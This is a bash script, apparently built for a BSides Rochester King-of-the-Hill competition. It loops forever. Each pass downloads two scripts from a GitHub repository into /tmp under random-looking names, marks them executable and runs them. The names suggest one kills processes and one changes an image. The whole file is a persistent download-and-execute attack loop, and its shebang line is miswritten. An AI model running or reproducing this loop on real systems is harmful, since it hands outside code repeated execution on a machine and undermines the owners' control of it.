!#/bin/bash
while :
do
	wget -O /tmp/aldskf.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
	wget -O /tmp/djflw.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh

	sleep 1
	chmod +x /tmp/aldskf.sh & chmod +x /tmp/djflw.sh
	/tmp/aldskf.sh & /tmp/djflw.sh  
done
